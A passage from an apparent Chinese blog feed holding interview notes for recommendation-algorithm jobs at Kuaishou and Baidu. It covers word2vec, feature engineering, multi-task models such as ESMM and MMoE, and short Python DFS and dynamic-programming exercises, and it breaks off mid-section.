倍的训练速度提升，同时提高低频词的词向量精度。</p><p>给定一个词频阈值 $t$ ，将 $w$ 以 $p(w)$ 的概率舍弃，$p(w)$ 的计算如下：</p><p>$$<br>\begin{aligned} p(w) &amp; &#x3D;1-\sqrt{\frac{t}{\operatorname{len}(w)}} \ \text { where } \operatorname{len}(w) &#x3D;\frac{\operatorname{count}(w)}{\sum_{u \in V} \operatorname{count}(u)}\end{aligned}<br>$$</p><h2 id="3-2-推荐系统中的特征工程"><a href="#3-2-推荐系统中的特征工程" class="headerlink" title="3.2 推荐系统中的特征工程"></a>3.2 推荐系统中的特征工程</h2><blockquote><p>面试官：你知道常见的推荐系统里面的特征分成哪几类？</p></blockquote><p>可以分成用户特征、物品特征和用户物品交互特征。</p><blockquote><p>面试官：比如这三类特征下面，你感觉比如这几类哪一类特征你觉得是更重要一些的？</p></blockquote><p>用户行为数据（User Behavior Data）是推荐系统最常用，也是最关键的数据。用户的潜在兴趣、用户对物品的真实评价都包含在用户的行为历史中。</p><p>用户行为在推荐系统中一般分为显性反馈行为（Explicit Feedback）和隐性反馈行为（Implicit Feedback）两种，在不同的业务场景中，它们会以不同的形式体现，如下图所示：</p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_NqnYQphc6O.png"></p><p>对用户行为数据的使用往往涉及对业务的理解，不同的行为在抽取特征时的权重不同，而且一些跟业务特点强相关的用户行为需要推荐工程师通过自己的观察才能发现。</p><p>在当前的推荐系统特征工程中，隐性反馈行为越来越重要，主要原因是显性反馈行为的收集难度过大，数据量小。在深度学习模型对数据量的要求越来越大的背景下，仅用显性反馈的数据不足以支持推荐系统训练过程的最终收敛。所以，能够反映用户行为特点的隐性反馈是目前特征挖掘的重点。</p><h2 id="3-3-SIM-模型"><a href="#3-3-SIM-模型" class="headerlink" title="3.3 SIM 模型"></a>3.3 SIM 模型</h2><blockquote><p>面试官：你知道 DIN 模型之后，一系列的序列建模的模型的思路是怎么样的，比如 SIM2.0、SIM3.0之类的？</p></blockquote><p>详见：<a href="https://juejin.cn/post/7263730927087452219" title="https://juejin.cn/post/7263730927087452219">https://juejin.cn/post/7263730927087452219</a></p><h2 id="3-4-特征交叉"><a href="#3-4-特征交叉" class="headerlink" title="3.4 特征交叉"></a>3.4 特征交叉</h2><blockquote><p>面试官：特征交叉可以想一下，在进入模型之后，因为所有的特征都会变成一个向量，然后做特征交叉的时候，可以分成这么几类，比如说在单个特征上有一个 $8$ 维的向量，每一维里面的向量其实也是可以做一些交叉的，称之为 bit-wise 的一个交叉，这种有了解过吗？可以往注意力机制那块去想一想。</p></blockquote><p>在推荐系统中，特征交叉是一种常用的手段，可以捕捉特征之间的相互作用，提升模型性能。特征交叉分为bit-wise、element-wise、和vector-wise三种方式。</p><ol><li><p>bit-wise：逐位进行特征交叉，通常适用于二进制特征；</p><p>在进行交互时，交互的形式类似于 $f(w_1 \times (a_1 \times a_2), w_2 \times (b_1 \times b_2), w_3 \times (c_1 \times c_2))$，此时认为特征交互是发生在元素级（bit-wise）上。</p></li><li><p>element-wise：逐元素进行特征交叉，适合连续特征或高维特征；</p></li><li><p>vector-wise：通过向量级别的交叉，可以捕捉更复杂的特征关系。</p><p>如果特征交互形式类似于 $f(w \times (a_1 \times a_2 ,b_1 \times b_2,c_1 \times c_2))$，那么我们认为特征交互是发生在特征向量级（vector-wise）。</p></li></ol><h2 id="3-5-多任务推荐算法"><a href="#3-5-多任务推荐算法" class="headerlink" title="3.5 多任务推荐算法"></a>3.5 多任务推荐算法</h2><blockquote><p>面试官：你对多目标多任务这一块有什么了解吗？</p></blockquote><h3 id="3-5-1-ESMM"><a href="#3-5-1-ESMM" class="headerlink" title="3.5.1 ESMM"></a>3.5.1 ESMM</h3><p>ESMM 在多任务学习中比较特殊，因为其优化的两个目标 — CTR 和 CVR，是有着严格的先后顺序的（转化行为必然发生在点击之后）。也正因如此，ESMM 的通用性不强，但由于其瞄准的两个目标在推荐系统中是最重要的，因此这个算法的影响还是很大的。</p><p>ESMM 主要想解决的两个问题分别是<strong>样本选择偏差</strong>（SSB，sample selection bias）以及<strong>数据稀疏</strong>（DS，data sparsity）。SSB 其实就是在训练 CVR 模型时由于只对点击样本进行训练而产生的<strong>训练和线上样本的分布偏差</strong>。用户完整的行为链路是 曝光 → 点击 → 转化 ，离线训练的样本抽取的是点击样本，而线上预测时面对的则是曝光样本，那这中间肯定会有一个 gap。DS 则比较好理解，就是点击样本比较少，转化行为更加稀疏。</p><p>第一个问题则确实是一个“痛点”。作者给出的方法是对 CTR 和 CTCVR（而不是 CVR）进行联合建模， CVR 通过 CTCVR&#x2F;CTR 间接得到。这样做的好处是可以利用所有曝光样本对两个目标进行训练，来解决 SSB 的问题；同时通过共享 embedding 层来解决 DS 问题。整个模型的结构类似于双塔，CVR 和 CTR 通过相乘连接得到 CTCVR。</p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_xFjrvOR3h5.png"></p><p>这个方法主要还是为了解决 CVR 预估上的问题，对于 CTR 任务来说效果可能一般，两个任务的效果容易出现跷跷板现象（即此消彼长）。</p><h3 id="3-5-2-MMoE"><a href="#3-5-2-MMoE" class="headerlink" title="3.5.2 MMoE"></a>3.5.2 MMoE</h3><p>MMoE 由底层共享（Shared-Bottom）演变而来。底层共享模型结构如下图 a 所示，其实就是多任务之间共享底层网络：</p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_emqYjUGADO.png"></p><p>MoE（Mixture-of-Experts）基于底层共享进行了改进，将共享网络拆分成多个并行的子网络（即专家网络），并通过 Gate 进行各个专家网络的权重调节。这里对于各个任务，底层的网络仍然是一样的，不同任务都会对 Gate 和专家网络产生影响，因此可以理解为是多个底层网络的集成，集成权重由网络输入（即样本）自适应调节。当各个任务训练样本重合度比较小时，Gate 或许也可以理解为一种和任务相关的对底层网络的集成控制，但是当重合度比较高时，这个区别或许就不明显了。此外，采用这种结构的好处是可以通过给 Gate 引入稀疏性而降低训练和测试时的计算量，带来性能提升。</p><p>MMoE（Multi-gate Mixture-of-Experts）在 MoE 的基础上引入多个 Gate，每个任务都有一个独立的 Gate，相当于每个任务都可以训练出一个和自身任务更匹配的专家网络加权网络。当各个任务之间的关联度比较小的时候，MMoE 通过引入更多参数（即多个 Gate）可以学习到对于不同任务来说更好的专家网络集成方式，通常也会比 MoE 取得更好的效果。此外，由于单个 Gate 的参数量比较少，因此即便是引入多个 Gate，总体的参数量和 MoE 还是接近的，性能上的收益还是有的。</p><p>这篇发表在 RecSys2019 上的文章描绘了 MMoE 是如何在 Youtube 视频推荐场景上应用的。这里的场景设定简单来说就是给用户推荐下一个他&#x2F;她可能感兴趣并且愿意观看的视频，候选集是粗排后的几百个视频，这里要做的是进行进一步地精排。目标有两种，一种是参与目标（engagement objective），例如点击和观看；另一种是满意度目标（satisfaction objective），例如点赞和屏蔽。针对不同目标就可以采用 MMoE 构建不同的 Gate 网络进行控制，整个网络架构如下图所示：</p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_xeFAxF00Jp.png"></p><p>这里有一个细节比较有意思，就是在 MoE 层之前，输入层之后还有一层全连接层，它的作用主要是用来减少计算量。因为输入层的维度往往非常大，如果直接连接 MoE，那么有 $n$ 个任务，参数就翻 $n$ 倍，但是一旦接入一层全连接层（即 Shared Bottom Layer），那么参数会少很多。</p><h3 id="3-5-3-SNR"><a href="#3-5-3-SNR" class="headerlink" title="3.5.3 SNR"></a>3.5.3 SNR</h3><p>SNR 全称是子网络路由（Sub-Network Routing），顾名思义就是提供一种对于每个任务来说更灵活的子网络联通方式。它和 MMoE 一样都是从 Shared Bottom 结构演变而来，相比于 MMoE 中各自独立的多个专家网络，SNR 提供了一种更灵活的子网络切分和联通的方式（本质上也就是参数共享方式）：</p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_PJtnQR32Vx.png"></p><p>正如上图所示，SNR 分成 SNR-Trans 和 SNR-Aver 两种。对于 SNR-Trans，上下两层的子网络通过线性变换连接，而 SNR-Aver 则是直接加权平均。两个子网络之间是否联通由编码变量（Coding Variable）$z$ 决定，$z&#x3D;1$ 表示连通，$z&#x3D;0$ 则表示不连通。假设有两层相邻网络，其中 $u_1,u_2,u_3$ 分别表示低一层子网络的输出，而 $v_1,v_2$ 则表示高一层子网络的输入，那么 SNR-Trans 可以被表示为：</p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image1.png"></p><p>其中 $W_{ij}$ 是从第 $j$ 个低层子网络向第 $i$ 个高层子网络的变换矩阵。而 SNR-Aver 则是：</p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image2.png"></p><p>其中 $I_{ij}$ 就是单位矩阵。假设我们有两个相同参数个数的 SNR-Trans 和 SNR-Aver 模型，那么 SNR-Trans 模型就会在层连接上有更多参数，而 SNR-Aver 模型则是在子网络内有更多参数。也正因为如此， SNR-Trans 网络更容易进行参数裁剪，因为只要某两个子网络不连接，就没必要有对应的变换矩阵；但是对于 SNR-Aver 网络来说，则必须某个子网络和所有其他子网络都不连接，才能被裁剪掉。</p><hr><h1 id="4-手撕代码"><a href="#4-手撕代码" class="headerlink" title="4 手撕代码"></a>4 手撕代码</h1><h2 id="4-1-DFS"><a href="#4-1-DFS" class="headerlink" title="4.1 DFS"></a>4.1 DFS</h2><p>给你三个数组：$[1, 2], [3, 4], [5, 6]$，计算得到它们的笛卡尔积为：<br>$$<br>    [1, 3, 5], [1, 3, 6], [1, 4, 5], [1, 4, 6], [2, 3, 5], [2, 3, 6], [2, 4, 5], [2, 4, 6]<br>$$</p><p>当时看到这道题我其实忘记了笛卡尔积是什么，感觉这方面有些薄弱，因此总结在 4.3 节。</p><p>一开始我说直接用三重循环，枚举每一种可能，但是面试官时间复杂度太高了，让我再想一下其他做法。然后我就一直想能进行什么优化呢？一点想不出来。然后面试官问我了解过 DFS 和 BFS 吗？我说我知道，然后就提示我用 DFS 做。</p><p>我当时就很纳闷，用 DFS 能进行什么优化？不还是要遍历每一种组合吗？但是当时并没有想太多，就赶紧按照面试官给我的提示开始写 DFS 了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ans = []</span><br><span class="line">nums = [[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>], [<span class="number">5</span>, <span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">i, path</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">global</span> ans</span><br><span class="line">        ans.append(path)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    t = path.copy()</span><br><span class="line">    t.append(nums[i][<span class="number">0</span>])</span><br><span class="line">    dfs(i + <span class="number">1</span>, t)</span><br><span class="line"></span><br><span class="line">    t = path.copy()</span><br><span class="line">    t.append(nums[i][<span class="number">1</span>])</span><br><span class="line">    dfs(i + <span class="number">1</span>, t)</span><br><span class="line"></span><br><span class="line">dfs(<span class="number">0</span>, [])</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure><p>当时写完了之后运行是不对的，面试官一直提示我是不是没有保存遍历过的状态，是不是应该用一个数据结构来保存一下，我当时没有听，因为我感觉不是那个问题。</p><p>原因是第一遍写的时候没有写成 <code>t = path.copy()</code> ，而是写成了 <code>t = path</code> ，就是这个问题。在 Python 里这么写 <code>t</code> 是 <code>path</code> 的一个引用，在改变 <code>t</code> 的时候，<code>path</code> 也会被改变，所以肯定不对鸭！！！</p><p>也可以改成下面这种写法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">i, path</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">3</span>:</span><br><span class="line">        ans.append(<span class="built_in">list</span>(path))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    path.append(nums[i][<span class="number">0</span>])</span><br><span class="line">    dfs(i + <span class="number">1</span>, path)</span><br><span class="line">    path.pop()  <span class="comment"># 回溯</span></span><br><span class="line">    </span><br><span class="line">    path.append(nums[i][<span class="number">1</span>])</span><br><span class="line">    dfs(i + <span class="number">1</span>, path)</span><br><span class="line">    path.pop()  <span class="comment"># 回溯</span></span><br></pre></td></tr></table></figure><p>还有其他几种方法可以在深度优先搜索（DFS）中避免修改同一对象：</p><ol><li>使用切片：<code>t = path[:]</code></li><li>使用 <code>list()</code> 函数：<code>t = list(path)</code></li></ol><p>DFS 一共遍历过 $2 \times 2 \times 2$ 个状态，所以时间复杂度为 $O(n^3)$，其中 $n&#x3D;2$ 。但是，如果我用以下三重循环，时间复杂度不也是 $O(n^3)$ 吗？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            ans.append([nums[<span class="number">0</span>][i], nums[<span class="number">1</span>][j], nums[<span class="number">2</span>][k]])</span><br></pre></td></tr></table></figure><p>所以感觉面试官有点离谱……</p><h2 id="4-2-动态规划"><a href="#4-2-动态规划" class="headerlink" title="4.2 动态规划"></a>4.2 动态规划</h2><p>第二道是一个动态规划，给你一个数组 $[3, 1, 7, 10]$ ，求其中不连续子数组的和的最大值，同时要输出这个最大和的子数组。该题中 $[3, 7],[3, 10], [3, 10], [1, 10]$ 是所有不连续的数组，最大的和是 $13$，那么输出 $[3, 10]$。</p><p>可以用动态规划来做，如下：</p><ol><li>状态表示：<ul><li>$f[i]$ 表示以第 $i$ 个元素结尾的不连续子数组的最大和</li><li>$states[i]$ 表示以第 $i$ 个元素结尾的不连续子数组</li></ul></li><li>状态计算：</li></ol><p>$$<br>f[i] &#x3D; \max(f[i], f[j] + \text{nums}[i]),j\in [0, i - 2]<br>$$</p><p>代码实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nums = [<span class="number">3</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">5</span>]</span><br><span class="line">n = <span class="built_in">len</span>(nums)</span><br><span class="line">f = nums[:]</span><br><span class="line">states = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    states[i].append(nums[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> f[i] &lt; f[j] + nums[i]:</span><br><span class="line">            f[i] = f[j] + nums[i]</span><br><span class="line">            states[i] = states[j] + [nums[i]]</span><br><span class="line"></span><br><span class="line">mx = f.index(<span class="built_in">max</span>(f))</span><br><span class="line"><span class="built_in">print</span>(f[mx], states[mx])</span><br></pre></td></tr></table></figure><p>第一遍写完了之后还是出现问题，面试官一直提示我说双循环里面是不是没有考虑 <code>else</code> 代码块需要进行的操作，后来发现还是 <code>copy()</code> 的问题，只能说面试官是好心的。</p><h2 id="4-3-向量各种乘积"><a href="#4-3-向量各种乘积" class="headerlink" title="4.3 向量各种乘积"></a>4.3 向量各种乘积</h2><h3 id="4-3-1-笛卡尔积"><a href="#4-3-1-笛卡尔积" class="headerlink" title="4.3.1 笛卡尔积"></a>4.3.1 笛卡尔积</h3><p>笛卡尔积是指在数学中，两个集合 $X$ 和 $Y$ 的笛卡尓积（Cartesian Product），又称直积，表示为 $X \times Y$，第一个对象是 $X$ 的成员而第二个对象是 $Y$ 的所有可能有序对的其中一个成员。</p><p>假设有 $A&#x3D;\{a,b\}, B&#x3D;\{0,1,2\}$，则：</p><p>$$<br>    A×B&#x3D;\{(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)\}<br>$$</p><p>$$<br>    B×A&#x3D;\{(0, a), (0, b), (1, a), (1, b), (2, a), (2, b)\}<br>$$</p><h3 id="4-3-2-哈达玛积"><a href="#4-3-2-哈达玛积" class="headerlink" title="4.3.2 哈达玛积"></a>4.3.2 哈达玛积</h3><p>哈达玛积又叫做按元素乘法。</p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image6.png"></p><h3 id="4-3-3-矩阵内积"><a href="#4-3-3-矩阵内积" class="headerlink" title="4.3.3 矩阵内积"></a>4.3.3 矩阵内积</h3><p>矩阵内积就是两个大小相同的矩阵元素一一对应相乘并且相加。</p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image7.png"></p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image8.png"></p><h3 id="4-3-4-点积（内积）"><a href="#4-3-4-点积（内积）" class="headerlink" title="4.3.4 点积（内积）"></a>4.3.4 点积（内积）</h3><p>矩阵内积退化成向量形式就是点积，也可以称作向量内积。两个向量里元素一一相乘，再相加。</p><p>适用范围：维度相同的两个向量。</p><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image9.png"></p><h3 id="4-3-5-外积"><a href="#4-3-5-外积" class="headerlink" title="4.3.5 外积"></a>4.3.5 外积</h3><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image3.png"></p><h3 id="4-3-6-克罗内克积"><a href="#4-3-6-克罗内克积" class="headerlink" title="4.3.6 克罗内克积"></a>4.3.6 克罗内克积</h3><p><img src="/2024/12/09/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%956%EF%BC%9A%E5%BF%AB%E6%89%8B%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image10.png"></p><hr><h1 id="5-参考资料"><a href="#5-参考资料" class="headerlink" title="5 参考资料"></a>5 参考资料</h1><ol><li><a href="https://www.lanqiao.cn/library/Algorithm-Interview-Notes-Chinese/B-%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86/B-%E4%B8%93%E9%A2%98-%E8%AF%8D%E5%90%91%E9%87%8F" title="NLP-词向量">NLP-词向量</a></li><li><a href="https://cenleiding.github.io/word2vec.html" title="word2vec词向量">word2vec词向量</a></li><li><a href="https://docs.pingcode.com/ask/48115.html" title="推荐系统中特征交叉的bit-wise、element-wise、vector-wise分别指的是什么">推荐系统中特征交叉的bit-wise、element-wise、vector-wise分别指的是什么</a></li><li><a href="https://blog.csdn.net/weixin_45459911/article/details/108669796" title="bit-wise和vector-wise区别">bit-wise和vector-wise区别</a></li><li><a href="http://www.wenqianzhao.cn/2022/06/04/multi-task-learning1/" title="推荐系统中的多任务学习算法（一）">推荐系统中的多任务学习算法（一）</a></li><li><a href="https://anchorety.github.io/2019/04/12/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E8%AF%8D%E5%90%91%E9%87%8F%E8%A1%A8%E7%A4%BA%E4%B9%8Bword2vec/">深度学习——词向量表示之word2vec</a></li><li><a href="https://blog.csdn.net/weixin_44555174/article/details/142753448">【万字长文】Word2Vec计算详解（三）分层Softmax与负采样</a></li><li><a href="https://www.cnblogs.com/xinyuePhd/p/14306070.html">机器学习常见的乘法（product）</a></li><li><a href="https://blog.csdn.net/wydbyxr/article/details/80779654">机器学习基础–math（16）–各种乘积</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 找工作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试记录5：百度技术一面</title>
      <link href="/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/"/>
      <url>/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="1-面试背景"><a href="#1-面试背景" class="headerlink" title="1 面试背景"></a>1 面试背景</h1><ul><li>面试公司：百度</li><li>面试岗位：AIGC—搜推方向</li><li>面试类型：技术一面</li><li>面试时间：2024-12-06 14:00~15:00</li><li>面试结果：通过 😊</li></ul><hr><h1 id="2-整体感受"><a href="#2-整体感受" class="headerlink" title="2 整体感受"></a>2 整体感受</h1><p>百度是纯简历面，简历从上到下挨个问的，除了有一个可能和深度学习关系不大没问，其余都问了。然后一道手撕代码题，由于自己之前做过，所以一看到题目就知道怎么做，然后很快就把代码写出来了。</p><p>之后面试官让我写一个样例跑一下，一跑一个准，直接秒了。由于我使用的语言是 C++，但是推荐算法一般都是 Python，所以面试管又让我用 Python 对数组进行排序，使用什么排序方法都可以。其实我早就开始用 Python 刷题了，所以很快就写出来了。</p><p>整体来说感觉很好，没有什么很致命的失误，唯一需要改进的可能是有时候表达再清晰一些。</p><hr><h1 id="3-提问的问题"><a href="#3-提问的问题" class="headerlink" title="3 提问的问题"></a>3 提问的问题</h1><h2 id="3-1-特征工程"><a href="#3-1-特征工程" class="headerlink" title="3.1 特征工程"></a>3.1 特征工程</h2><blockquote><p>面试官：这个天池新闻推荐系统比赛中，你基本上用了哪些特征呢？</p></blockquote><p>特征工程的话主要分为三个部分：用户特征、物品特征和用户历史交互特征。</p><h3 id="3-1-1-用户特征"><a href="#3-1-1-用户特征" class="headerlink" title="3.1.1 用户特征"></a>3.1.1 用户特征</h3><ol><li><p>登录环境：用户点击环境、登录设备等特征（数据集中已给出）</p></li><li><p>用户的主题爱好特征：对于用户点击的历史文章主题进行一个统计，然后对于当前文章看看是否属于用户已经点击过的主题</p></li><li><p>用户新闻阅读数量</p></li><li><p>用户点击新闻的创建时间差的平均值</p></li><li><p>用户点击新闻的点击时间差的平均值</p></li><li><p>用户点击新闻的点击-创建时间差的统计值：mean，std</p></li><li><p>用户点击新闻的 <code>click_datetime_hour</code> 统计值</p></li><li><p>用户的字数爱好特征：对于用户点击的历史文章的字数统计，求一个均值</p></li><li><p>用户的时间统计特征：根据其点击的历史文章列表的点击时间和文章的创建时间做统计特征，比如求均值，这个可以反映用户对于文章时效的偏好</p></li><li><p>用户活跃度：基于用户的点击文章次数和点击时间构造可以表现用户活跃度的特征，具体如下：</p><p>首先根据用户 <code>user_id</code> 分组，对于每个用户，计算点击文章的次数，两两点击文章时间间隔的均值。把点击次数取倒数和时间间隔的均值统一归一化，然后两者相加合并，该值越小，说明用户越活跃。</p></li></ol><h3 id="3-1-2-物品特征"><a href="#3-1-2-物品特征" class="headerlink" title="3.1.2 物品特征"></a>3.1.2 物品特征</h3><ol><li>新闻字数（数据集已给出）</li><li>新闻创建时间（数据集已给出）</li><li>热门物品：基于文章被点击次数和时间构造可以反映文章热度的特征</li></ol><h3 id="3-1-3-用户历史行为特征"><a href="#3-1-3-用户历史行为特征" class="headerlink" title="3.1.3 用户历史行为特征"></a>3.1.3 用户历史行为特征</h3><p>对于每个用户召回的每个商品做特征，获取最后点击的 $n$ 个商品的 <code>item_id</code>。</p><p>对于该用户的每个召回商品，计算与上面最后 $N$ 次点击商品的相似度、时间差特征、相似性特征、字数差特征、与该用户的相似性特征。</p><p>往往用户的最后一次点击会和其最后几次点击有很大的关联。所以我们就可以对于每个候选文章，做出与最后几次点击相关的特征如下：</p><ol><li>候选物品与最后几次点击的相似性特征（embedding 内积）——这个直接关联用户历史行为</li><li>候选物品与最后几次点击的相似性特征的统计特征——统计特征可以减少一些波动和异常</li><li>候选物品与最后几次点击文章的字数差的特征——可以通过字数看用户偏好</li><li>候选物品与最后几次点击的文章建立的时间差特征——时间差特征可以看出该用户对于文章的实时性的偏好</li></ol><h2 id="3-2-特征使用"><a href="#3-2-特征使用" class="headerlink" title="3.2 特征使用"></a>3.2 特征使用</h2><blockquote><p>面试官：那这些不同维度的特征是怎么结合使用的呢？</p></blockquote><p>上面构造的这些特征可以分为两类：离散型特征和连续型特征。</p><h3 id="3-2-1-离散特征构建"><a href="#3-2-1-离散特征构建" class="headerlink" title="3.2.1 离散特征构建"></a>3.2.1 离散特征构建</h3><p>离散特征是非常常见的一类特征，推荐系统中的用户属性数据、物品属性数据中就包含大量的类别特征，如性别、学历、视频的类型、标签、导演、国别等等。对于离散特征，一般可以采用如下 $2$ 种方式对特征进行编码（即特征构建）。</p><h4 id="3-2-1-1-one-hot-编码"><a href="#3-2-1-1-one-hot-编码" class="headerlink" title="3.2.1.1 one-hot 编码"></a>3.2.1.1 one-hot 编码</h4><p>one-hot 编码通常用于离散特征（也叫类别特征），如果某个类别特征有 $k$ 类，我们将这 $k$ 类固定一个序关系，可以将每个值映射为一个 $k$ 维向量，其中这个值所在的分量为 $1$，其他分量为 $0$。比如性别进行编码的话，男可以编码为 $(1, 0)$，女可以编码为 $(0, 1)$。该方法当类别的数量很多时，特征空间会变得非常大。</p><p>当某个特征有多个类别时，这时 one-hot 编码可以拓展为 multi-hot 编码。下面举个视频推荐系统中 multi-hot 编码的例子。如果要将视频的标签进行 multi-hot 编码，怎么做呢？我们知道每个视频可能有多个标签（比如恐怖、科幻等），编码的时候将该视频包含的所有标签对应的分量处设置为 $1$，其他为 $0$。这里的 $n$ 是所有视频所有标签的总量，也即是全部可能的标签数量，一般是一个很大的数字（可能几万到几十万不等）。</p><h4 id="3-2-1-2-散列编码"><a href="#3-2-1-2-散列编码" class="headerlink" title="3.2.1.2 散列编码"></a>3.2.1.2 散列编码</h4><p>特征散列的目标就是是把原始的高维特征向量压缩成较低维特征向量，且尽量不损失原始特征的表达能力，其优势在于实现简单，所需额外计算量小。</p><p>降低特征维度，也能加速算法训练与预测，降低内存消耗，但代价是通过哈希转换后学习到的模型变得很难检验（因为一般哈希函数是不可逆的），我们很难对训练出的模型参数做出合理解释。特征散列的另一个问题是可能把多个原始特征哈希到相同的位置上，出现哈希冲突现象，但经验表明这种冲突对算法的精度影响很小，通过选择合适的 hash 函数也可以减少冲突概率。其实，每种程度的 hash 冲突也不一定是坏事，可能还可以提升模型的泛化能力。</p><h3 id="3-2-2-连续特征构建"><a href="#3-2-2-连续特征构建" class="headerlink" title="3.2.2 连续特征构建"></a>3.2.2 